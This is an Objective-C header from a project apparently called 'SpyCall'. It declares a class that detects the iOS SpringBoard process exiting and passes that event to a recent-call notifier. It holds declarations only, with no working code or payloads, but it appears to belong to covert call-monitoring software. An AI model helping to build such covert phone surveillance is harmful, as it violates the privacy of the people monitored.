//
//  SpringBoardKilledlNotifier.h
//  SpyCall
//
//  Created by Khaneid Hantanasiriskul on 1/6/2559 BE.
//
//

#import <Foundation/Foundation.h>

@class RecentCallNotifier;

@interface SpringBoardKilledNotifier : NSObject{
@private
    RecentCallNotifier		*mRecentCallNotifier;			// assign
    CFFileDescriptorRef mNoteExitKQueueRef;
}

@property (nonatomic, assign) RecentCallNotifier *mRecentCallNotifier;

- (id) initWithNotifier: (RecentCallNotifier *) aNotifier;
- (void) registerSpringBoardNotification;
- (void) unregisterSpringBoardNotification;

@end
